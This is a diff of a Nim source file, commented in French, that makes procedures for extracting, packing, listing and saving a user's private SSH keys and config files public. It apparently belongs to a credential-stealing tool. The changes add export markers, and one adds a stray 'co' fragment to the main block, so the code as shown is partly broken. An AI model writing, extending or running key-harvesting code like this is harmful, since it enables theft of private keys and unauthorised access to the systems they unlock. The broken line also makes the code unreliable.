@@ -1,6 +1,6 @@
 import os, strutils, times
 
-proc extractSSHKeys(): seq[string] =
+proc extractSSHKeys*(): seq[string] =
   ## Extrait toutes les clés SSH privées et fichiers de config
   result = @[]
   
@@ -41,7 +41,7 @@ proc extractSSHKeys(): seq[string] =
     if file notin result:
       result.add(file)
 
-proc packSSHKeys(): string =
+proc packSSHKeys*(): string =
   ## Crée une archive des clés SSH trouvées
   let keys = extractSSHKeys()
   
@@ -72,7 +72,7 @@ proc packSSHKeys(): string =
   
   return result
 
-proc getSSHKeysInfo(): string =
+proc getSSHKeysInfo*(): string =
   ## Retourne des infos sur les clés trouvées (sans les copier)
   let keys = extractSSHKeys()
   
@@ -100,7 +100,7 @@ proc getSSHKeysInfo(): string =
       except:
         discard
 
-proc saveSSHKeys(): string =
+proc saveSSHKeys*(): string =
   ## Sauvegarde les clés dans un fichier (pour debug)
   let keys = extractSSHKeys()
   
@@ -131,7 +131,7 @@ when isMainModule:
   echo repeat("=", 50)
   
   let keys = extractSSHKeys()
-  
+  co
   if keys.len == 0:
     echo "[-] Aucune clé SSH trouvée"
     echo "[*] Dossier vérifié: ", getEnv("USERPROFILE") / ".ssh"
